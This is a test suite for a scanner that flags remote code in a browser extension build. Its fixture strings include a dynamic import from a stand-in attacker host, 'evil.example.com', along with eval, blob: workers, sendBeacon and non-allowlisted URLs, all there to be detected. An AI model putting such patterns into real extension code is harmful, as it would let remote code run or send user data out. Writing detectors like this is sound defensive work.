import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { loadAllowlist, scanDirectory, scanText } from '../../../scripts/verify-no-remote-code.mjs';

// Spelled out rather than loaded from the file, so widening the allowlist is a two-file diff. The
// third entry is the OAuth token endpoint the PKCE fallback posts to (ARCHITECTURE §13.2).
const ALLOWED = [
  'https://www.googleapis.com/',
  'https://accounts.google.com/',
  'https://oauth2.googleapis.com/',
];

const rulesFor = (source: string, file = 'bundle.js'): string[] =>
  scanText(file, source, ALLOWED).map((violation: { rule: string }) => violation.rule);

describe('remote-code scanner (INV-1, INV-3, INV-8)', () => {
  it('passes a clean bundle', () => {
    const clean = `
      import { seal } from "./crypto/envelope.js";
      const key = await crypto.subtle.importKey("raw", bytes, "AES-GCM", false, ["encrypt"]);
      export async function save(item) { return seal(key, item); }
    `;
    expect(scanText('clean.js', clean, ALLOWED)).toEqual([]);
  });

  it('passes a clean extension page', () => {
    const html =
      '<!doctype html><html><head><link rel="stylesheet" href="/assets/popup-a1b2.css">' +
      '<script type="module" crossorigin src="/assets/popup-a1b2.js"></script></head><body></body></html>';
    expect(scanText('popup.html', html, ALLOWED)).toEqual([]);
  });

  it('rejects a CDN script tag', () => {
    const html = '<script src="' + 'https://cdn.example.com/analytics.js' + '"></script>';
    expect(rulesFor(html, 'popup.html')).toContain('script-src-remote');
  });

  it('rejects a remote stylesheet', () => {
    const html = '<link rel="stylesheet" href="' + 'https://fonts.example.com/x.css' + '">';
    expect(rulesFor(html, 'popup.html')).toContain('stylesheet-remote');
  });

  it('rejects eval and the Function constructor', () => {
    expect(rulesFor('const f = eval("1 + 1");')).toContain('eval');
    expect(rulesFor('const f = new Function("return 1");')).toContain('new-function');
    expect(rulesFor('const f = Function("return 1");')).toContain('new-function');
  });

  it('does not mistake a property named eval for the real thing', () => {
    expect(rulesFor('const value = options.eval();')).toEqual([]);
  });

  it('rejects a remote or computed dynamic import', () => {
    expect(rulesFor('await import("' + 'https://evil.example.com/p.js' + '");')).toContain(
      'dynamic-import',
    );
    expect(rulesFor('await import(specifier);')).toContain('dynamic-import');
    expect(rulesFor('await import("./lazy.js");')).toEqual([]);
  });

  it('rejects a blob: worker and importScripts', () => {
    expect(rulesFor('const w = new Worker("blob:chrome-extension://abc/1234");')).toContain(
      'script-url-scheme',
    );
    expect(rulesFor('importScripts("./sw-helper.js");')).toContain('import-scripts');
  });

  it('rejects WASM, sendBeacon and XMLHttpRequest', () => {
    expect(rulesFor('await WebAssembly.instantiate(bytes);')).toContain('wasm');
    expect(rulesFor('navigator.sendBeacon("/collect", body);')).toContain('send-beacon');
    expect(rulesFor('const r = new XMLHttpRequest();')).toContain('xhr');
  });

  it('rejects a string-bodied timer', () => {
    expect(rulesFor('setTimeout("doThing()", 100);')).toContain('string-timer');
  });

  it('rejects a non-allowlisted absolute URL anywhere in the file', () => {
    expect(rulesFor('const endpoint = "' + 'https://telemetry.example.com/v1' + '";')).toContain(
      'absolute-url',
    );
  });

  it('accepts the allowlisted Google endpoints', () => {
    const drive =
      'const url = "https://www.googleapis.com/drive/v3/files";' +
      'const auth = "https://accounts.google.com/o/oauth2/v2/auth";';
    expect(scanText('drive.js', drive, ALLOWED)).toEqual([]);
  });

  it('reports the file it was given, so the failure is actionable', () => {
    const [violation] = scanText('assets/manager-9f8e.js', 'eval(x)', ALLOWED);
    expect(violation).toMatchObject({ file: 'assets/manager-9f8e.js', rule: 'eval' });
  });
});

describe('remote-code scanner over a directory', () => {
  let dir: string;

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'vaultamark-scan-'));
    await mkdir(join(dir, 'assets'), { recursive: true });
    await writeFile(join(dir, 'manifest.json'), '{"manifest_version":3}');
    await writeFile(join(dir, 'assets', 'popup-a1b2.js'), 'export const ready = true;');
    // A binary asset and a source map: both are skipped, the map because it embeds the original
    // sources (which legitimately mention every pattern the scanner hunts for) and never ships.
    await writeFile(join(dir, 'assets', 'icon.png'), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0xff]));
    await writeFile(
      join(dir, 'assets', 'popup-a1b2.js.map'),
      JSON.stringify({ sourcesContent: ['const f = eval("1");'] }),
    );
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('passes a clean build and walks into subdirectories', async () => {
    await expect(scanDirectory(dir)).resolves.toEqual([]);
  });

  it('fails a build with a violation nested in assets/', async () => {
    await writeFile(join(dir, 'assets', 'manager-c3d4.js'), 'const load = (u) => import(u);');
    const violations = await scanDirectory(dir);
    expect(violations).toHaveLength(1);
    expect(violations[0]).toMatchObject({
      file: 'assets/manager-c3d4.js',
      rule: 'dynamic-import',
    });
  });

  it('reads the allowlist this repository actually ships', async () => {
    await expect(loadAllowlist()).resolves.toEqual(ALLOWED);
  });
});
